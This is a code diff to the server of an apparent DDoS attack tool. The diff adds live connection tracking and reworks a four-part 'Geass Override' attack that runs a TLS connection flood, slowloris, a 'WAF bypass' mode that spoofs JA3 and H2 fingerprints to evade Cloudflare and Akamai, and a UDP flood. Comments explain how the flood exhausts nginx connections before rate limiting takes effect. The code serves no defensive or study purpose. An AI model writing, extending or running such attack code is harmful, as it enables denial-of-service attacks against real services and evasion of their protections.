@@ -36,6 +36,9 @@ const WORKER_FILE = path.join(
 // ── Active attack worker sets ──────────────────────────────────────────────
 const attackWorkers = new Map<number, Worker[]>();
 
+// ── Live in-memory connection counter (slowloris + conn-flood) ─────────────
+export const attackLiveConns = new Map<number, number>();
+
 // ── CPU count (how many parallel workers to spawn) ────────────────────────
 const CPU_COUNT = Math.max(1, os.cpus().length);
 
@@ -99,10 +102,11 @@ const HTTP_PROXY_METHODS = new Set(["http-flood", "http-bypass", "http-pipeline"
 
 function spawnPool(
   method: string, target: string, port: number, threads: number,
-  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number) => void,
+  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
   const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
   const workers: Worker[] = [];
+  const workerConns = new Array<number>(numWorkers).fill(0);
   // Pass top 100 fastest proxies to HTTP workers for rotation
   const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
     ? proxyCache.slice(0, 100).map(p => ({ host: p.host, port: p.port }))
@@ -122,8 +126,12 @@ function spawnPool(
       const idx = i;
       workers.push(w);
 
-      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean }) => {
-        if (msg.pkts !== undefined && msg.bytes !== undefined) onStats(msg.pkts, msg.bytes);
+      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean; conns?: number }) => {
+        if (msg.pkts !== undefined && msg.bytes !== undefined) {
+          if (msg.conns !== undefined) workerConns[idx] = msg.conns;
+          const totalConns = workerConns.reduce((a, b) => a + b, 0);
+          onStats(msg.pkts, msg.bytes, totalConns > 0 ? totalConns : undefined);
+        }
         if (msg.done) { finished.add(idx); tryResolve(); }
       });
       w.on("error", () => { finished.add(idx); tryResolve(); });
@@ -145,7 +153,7 @@ function spawnPool(
 // ─────────────────────────────────────────────────────────────────────────
 async function runAttackWorkers(
   method: string, target: string, port: number, threads: number,
-  signal: AbortSignal, onStats: (p: number, b: number) => void,
+  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
   // Simulation methods run inline (no network, just math)
   const SIM_METHODS = new Set(["icmp-flood","dns-amp","ntp-amp","mem-amp","ssdp-amp"]);
@@ -162,26 +170,42 @@ async function runAttackWorkers(
     return;
   }
 
-  // Geass Override: QUAD vector — Connection Flood + Slowloris + HTTP/2 + UDP
+  // Geass Override: QUAD vector — Connection Flood + Slowloris + WAF Bypass + UDP
   // Connection Flood exhausts nginx worker_connections BEFORE HTTP rate limiting
   // Slowloris holds half-open TLS connections for the remainder
-  // HTTP/2 multiplexed streams fill any remaining capacity
+  // WAF Bypass (JA3 + AKAMAI H2 fingerprint) evades Cloudflare/Akamai layer
   // UDP saturates bandwidth simultaneously
   if (method === "geass-override") {
-    const connW = Math.ceil(CPU_COUNT * 0.35);  // 3 workers → TLS connection flood
-    const slowW = Math.ceil(CPU_COUNT * 0.25);  // 2 workers → Slowloris
-    const h2W   = Math.ceil(CPU_COUNT * 0.25);  // 2 workers → HTTP/2
+    const connW = Math.ceil(CPU_COUNT * 0.35);  // workers → TLS connection flood
+    const slowW = Math.ceil(CPU_COUNT * 0.25);  // workers → Slowloris
+    const wafW  = Math.ceil(CPU_COUNT * 0.25);  // workers → WAF Bypass H2
 
-    const connT = Math.max(1, Math.round(threads * 0.40));  // 40% → connection flood
-    const slowT = Math.max(1, Math.round(threads * 0.30));  // 30% → slowloris
-    const h2T   = Math.max(1, Math.round(threads * 0.20));  // 20% → http/2
-    const udpT  = Math.max(1, threads - connT - slowT - h2T); // remainder → UDP
+    // Guaranteed minimums per sub-method — Geass never starves a vector
+    const connT = Math.max(50, Math.round(threads * 0.40));  // 40% → connection flood
+    const slowT = Math.max(30, Math.round(threads * 0.30));  // 30% → slowloris
+    const wafT  = Math.max(20, Math.round(threads * 0.20));  // 20% → waf-bypass h2
+    const udpT  = Math.max(8,  Math.round(threads * 0.10));  // 10% → UDP bandwidth flood
+
+    // Track conns per pool, sum and forward through main onStats so route handler stores by correct ID
+    const geassConnsPerPool = new Map<string, number>();
+    const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
+      if (c !== undefined) {
+        geassConnsPerPool.set(poolKey, c);
+        const total = [...geassConnsPerPool.values()].reduce((a, v) => a + v, 0);
+        onStats(p, b, total);
+      } else {
+        onStats(p, b);
+      }
+    };
+
+    const connOnStats = makeGeassOnStats("conn");
+    const slowOnStats = makeGeassOnStats("slow");
 
     await Promise.all([
-      spawnPool("conn-flood",  target, port, connT, connW, signal, onStats),
-      spawnPool("slowloris",   target, port, slowT, slowW, signal, onStats),
-      spawnPool("http2-flood", target, port, h2T,   h2W,   signal, onStats),
-      spawnPool("udp-flood",   target, port, udpT,  1,     signal, onStats), // 1 UDP worker
+      spawnPool("conn-flood", target, port, connT, connW, signal, connOnStats),
+      spawnPool("slowloris",  target, port, slowT, slowW, signal, slowOnStats),
+      spawnPool("waf-bypass", target, port, wafT,  wafW,  signal, onStats),
+      spawnPool("udp-flood",  target, port, udpT,  1,     signal, onStats), // 1 UDP worker
     ]);
     return;
   }
@@ -219,8 +243,12 @@ router.post("/attacks", async (req, res): Promise<void> => {
   })();
 
   void runAttackWorkers(method, target, port, threads, ctrl.signal,
-    (pkts, bytes) => void addStats(id, pkts, bytes)
+    (pkts, bytes, conns) => {
+      void addStats(id, pkts, bytes);
+      if (conns !== undefined) attackLiveConns.set(id, conns);
+    }
   ).finally(async () => {
+    attackLiveConns.delete(id);
     clearTimeout(stopTimer);
     attackAborts.delete(id);
     try {
@@ -253,6 +281,13 @@ router.get("/attacks/stats", async (_req, res): Promise<void> => {
     recentAttacks:    attacks.slice(0, 10),
     cpuCount:         CPU_COUNT,
   });
+});
+
+// Live in-memory stats (active connections) — not stored in DB
+router.get("/attacks/:id/live", (req, res): void => {
+  const id = parseInt(req.params.id, 10);
+  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
+  res.json({ conns: attackLiveConns.get(id) ?? 0, running: attackAborts.has(id) });
 });
 
 router.get("/attacks/:id", async (req, res): Promise<void> => {
